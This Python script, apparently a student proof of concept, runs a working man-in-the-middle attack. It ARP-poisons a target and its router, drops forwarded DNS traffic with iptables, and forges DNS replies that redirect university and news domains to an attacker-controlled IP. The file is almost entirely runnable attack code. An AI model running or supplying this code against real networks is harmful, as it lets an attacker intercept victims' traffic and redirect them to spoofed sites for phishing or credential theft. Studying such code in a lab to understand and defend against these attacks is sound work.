#!/usr/bin/python
#------------------------------------------------------------------------------
# 	SOURCE:		dns_spoofer.py
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:		Proof of concept DNS spoofer using python and scapy library.
#------------------------------------------------------------------------------
import signal
import uuid
import sys
import socket
import pcapy
import threading
import time
from uuid import getnode as get_mac
from scapy.all import *
from multiprocessing import *
from subprocess import Popen, PIPE


# 2d array to hold whitelisted sites and the IP address to redirect them to
sites = [["milliways.bcit.ca", "192.168.0.18"],
            ["bcit.ca", "192.168.0.18"],
            ["sfu.ca", "192.168.0.18"],
            ["ubc.ca", "192.168.0.18"],
            ["cbc.ca", "192.168.0.18"],
            ["sd43.bc.ca", "192.168.0.18"]]


#------------------------------------------------------------------------------
# 	FUNCTION:	init_setup()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:		Drops firewall forwarding for UDP packets to port 53.
#------------------------------------------------------------------------------
def init_setup():
    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)

	
#------------------------------------------------------------------------------
# 	FUNCTION:	get_my_mac()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:		Get MAC address of this machine (attacker machine).
#------------------------------------------------------------------------------
def get_my_mac():
    _mac_addr = hex(uuid.getnode()).replace('0x', '')
    return str(':'.join(_mac_addr[i : i + 2] for i in range(0, 11, 2)))


#------------------------------------------------------------------------------
# 	FUNCTION:	get_target_mac()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:		Get MAC address of target machine. Makes use of two threads.
# 				One thread to send an ARP query to target machine. The other
#				thread is used to read the query response from target machine
#				as to extract the target machines MAC address.
#------------------------------------------------------------------------------
def get_target_mac():
    _thread1 = threading.Thread(target=arp_request_target, args=(my_ip, my_mac, target_ip))
    _thread2 = threading.Thread(target=read_target_response, args=())
    _thread2.start()
    time.sleep(0.5)
    _thread1.start()
    _thread1.join()
    _thread2.join()


#------------------------------------------------------------------------------
# 	FUNCTION:	get_router_mac()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:		Get MAC address of router. Makes use of two threads.
# 				One thread to send an ARP query to router. The other
#				thread is used to read the query response from the router
#				as to extract the routers MAC address.
#------------------------------------------------------------------------------
def get_router_mac():
    _thread1 = threading.Thread(target=arp_request_router, args=(my_ip, my_mac, router_ip))
    _thread2 = threading.Thread(target=read_router_response, args=())
    _thread2.start()
    time.sleep(0.5)
    _thread1.start()
    _thread1.join()
    _thread2.join()


#------------------------------------------------------------------------------
# 	FUNCTION:	arp_request_target(my_ip, my_mac, target_ip)
#					my_ip : ip of attacker machine
#					my_mac : MAC address of attacker machine
#					target_ip : ip of target machine
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:		Send ARP request to get MAC address of target IP.
#------------------------------------------------------------------------------
def arp_request_target(my_ip, my_mac, target_ip):
    send(ARP(op=1, hwsrc=my_mac, psrc=my_ip, pdst=target_ip), verbose=0)


#------------------------------------------------------------------------------
# 	FUNCTION:	arp_request_target(my_ip, my_mac, router_ip)
#					my_ip : ip of attacker machine
#					my_mac : MAC address of attacker machine
#					router_ip : ip of router
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:		Send ARP request to get MAC address of router IP.
#------------------------------------------------------------------------------
def arp_request_router(my_ip, my_mac, router_ip):
    send(ARP(op=1, hwsrc=my_mac, psrc=my_ip, pdst=router_ip), verbose=0)


#------------------------------------------------------------------------------
# 	FUNCTION:	read_target_response()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:		Read ARP response of target to get target MAC address.
#------------------------------------------------------------------------------
def read_target_response():
    pkt = sniff(filter='arp', count=2) 	# sniff dns response
    sys.stdout.write("Target ARP Response: " + target_ip + " -> " + pkt[1].hwsrc + '\n')
    global target_mac
    target_mac = str(pkt[1].hwsrc)


#------------------------------------------------------------------------------
# 	FUNCTION:	read_router_response()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:	 	Read ARP response of router to get target MAC address.
#------------------------------------------------------------------------------
def read_router_response():
    pkt = sniff(filter='arp', count=2)	# sniff dns response
    sys.stdout.write("Router ARP Response: " + router_ip + " -> " + pkt[1].hwsrc + '\n')
    global router_mac
    router_mac = str(pkt[1].hwsrc)


#------------------------------------------------------------------------------
# 	FUNCTION:	arp_poison_target()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:	 	ARP poison the targets ARP cache by sending fake ARP response.
#------------------------------------------------------------------------------
def arp_poison_target():
    target_arp_poison = Ether(src=my_mac, dst=target_mac)/ARP(hwsrc=my_mac, hwdst=target_mac, psrc=router_ip, pdst=target_ip, op=2)
    sendp(target_arp_poison, verbose=0)


#------------------------------------------------------------------------------
# 	FUNCTION:	arp_poison_router()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:	 	ARP poison the routers ARP cache by sending fake ARP response.
#------------------------------------------------------------------------------
def arp_poison_router():
    router_arp_poison = Ether(src=my_mac, dst=router_mac)/ARP(hwsrc=my_mac, hwdst=router_mac, psrc=target_ip, pdst=router_ip, op=2)
    sendp(router_arp_poison, verbose=0)


#------------------------------------------------------------------------------
# 	FUNCTION:	arp_poison()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:	 	High level function to ARP poison target and router.
#------------------------------------------------------------------------------
def arp_poison():
    i = 0
    while i < 10:
        arp_poison_target()
        arp_poison_router()
        time.sleep(2)


#------------------------------------------------------------------------------
# 	FUNCTION:	print_info()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:	 	Print network info.
#------------------------------------------------------------------------------
def print_info():
    sys.stdout.write("\nAttacker: " + my_ip + " -> " + my_mac + '\n')
    sys.stdout.write("Target  : " + target_ip + " -> " + target_mac + '\n')
    sys.stdout.write("Router  : " + router_ip + " -> " + router_mac + '\n\n')


#------------------------------------------------------------------------------
# 	FUNCTION:	read_dns()
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:	 	Sniff DNS query packets from target machine.
#------------------------------------------------------------------------------
def read_dns():
    sniff_filter = "udp and port 53 and src " + str(target_ip)
    sniff(filter=sniff_filter, prn=redirect)


#------------------------------------------------------------------------------
# 	FUNCTION:	redirect(packet)
#					packet : the sniffed DNS packet from target
#
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:	 	Check if site from DNS query macthes a whitelisted site.
#------------------------------------------------------------------------------
def redirect(packet):
    for x in range(len(sites)):
        if sites[x][0] in packet.getlayer(DNS).qd.qname:
            spoof_packet(packet, sites[x][1])
            print(str(packet.getlayer(DNS).qd.qname + " -> " + sites[x][1]))


#------------------------------------------------------------------------------
# 	FUNCTION:	spoof_packet(packet, ip)
#					packet : the sniffed DNS packet from target
#					ip : ip to put in crafted DNS response as to redirect target
# 	AUTHOR:		Alex Zielinski
#
#	DATE:		November 5, 2018
#
#	DESC:	 	Check if site from DNS query macthes a whitelisted site.
#------------------------------------------------------------------------------
def spoof_packet(packet, ip):
    ans = DNSRR(rrname=packet[DNS].qd.qname, ttl=200, rdata=ip)
    dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=ans)
    response = IP(dst=target_ip, src=packet[IP].dst) / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /dns
    send(response, verbose=0)


#------------------------------------------------------------------------------
#   FUNTION:    main()
#
#   AUTHOR:     Alex Zielinski
#
#   DATE:       November 5 2018
#
#   DESC:       Main entry piont of program
#------------------------------------------------------------------------------
if __name__ == "__main__":

	# Validate CMD ARGS
    if len(sys.argv) != 4:
        print("\nError: invalid arguments")
        print("Usage: ./dns_spoof.py <ATTACKER IP> <TARGET IP> <ROUTER IP>\n")
        exit()
	
	# Extract CMD ARGS
    my_ip = sys.argv[1]
    target_ip = sys.argv[2]
    router_ip = sys.argv[3]
    my_mac = get_my_mac()

	# Drop firewall forwarding
    init_setup()
	
	# Get MAC addr from target and router
    get_target_mac()
    get_router_mac()
	
	# Print networking info (who has what IP and MAC addr)
    print_info()
	
	# Start ARP poisoning and DNS spoofing
    arp_poison_proc = Process(target=arp_poison, args=())
    dns_thread = Process(target=read_dns, args=())
    arp_poison_proc.start()
    dns_thread.start()
    arp_poison_proc.join()
    dns_thread.join()
